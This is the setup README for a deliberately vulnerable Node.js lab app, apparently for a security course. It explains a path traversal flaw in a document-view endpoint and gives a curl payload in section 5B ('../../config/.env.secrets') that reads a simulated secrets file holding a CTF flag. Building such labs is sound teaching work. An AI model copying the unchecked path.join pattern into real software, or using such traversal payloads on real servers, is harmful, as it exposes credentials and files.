# Path Traversal - Vulnerable Application Setup

**Developer:** Aadhil Rizwan (Vulnerable Application Development Lead)  
**Target Vulnerability:** Path Resolution / Directory Traversal  
**Target Endpoint:** `GET /api/documents/view?file=<filename>`  
**Insecure File & Line:** `routes/documents.js:54`  
**Permitted Base Directory:** `public/documents/` (or `demo-files/`)  

---

## 1. Overview

This service allows users to view compliance and audit documents intended to be strictly confined to the permitted document directory. The route constructs the requested file path using Node's standard `path.join()`. Because `path.join()` normalizes relative dot-dot-slash tokens (`../`) without checking if the resolved path escapes the base directory, arbitrary server files can be read.

---

## 2. Prerequisites

- **Node.js**: v18 or higher (v20+ recommended)
- **npm**: v9 or higher

---

## 3. Installation & Execution

```bash
cd path-traversal/vulnerable

# 1. Install dependencies
npm install

# 2. Start the application
npm start
```

The application runs on:
```text
http://localhost:3001
```

---

## 4. Permitted Demonstration Files

The following non-sensitive files are located in `public/documents/`:
- `audit_report_2026.txt`: Internal corporate audit report summary
- `security_policy_v2.txt`: Password and access control policy
- `network_guidelines.txt`: Subnet topology guidelines

---

## 5. Verification Commands

### A. Legitimate Retrieval (Normal Use)
```bash
curl http://localhost:3001/api/documents/view?file=audit_report_2026.txt
```
*Expected Status:* `200 OK` (returns the harmless audit document).

### B. Exploitation Test (For Kav)
```bash
curl "http://localhost:3001/api/documents/view?file=../../config/.env.secrets"
```
*Expected Result:* Escapes the document directory and outputs simulated production secrets and the assessment flag:
```text
APP_SECRET_KEY="ISEC3004{fl4g_d1r3ct0ry_tr4v3rs4l_succ3ss_demo}"
```
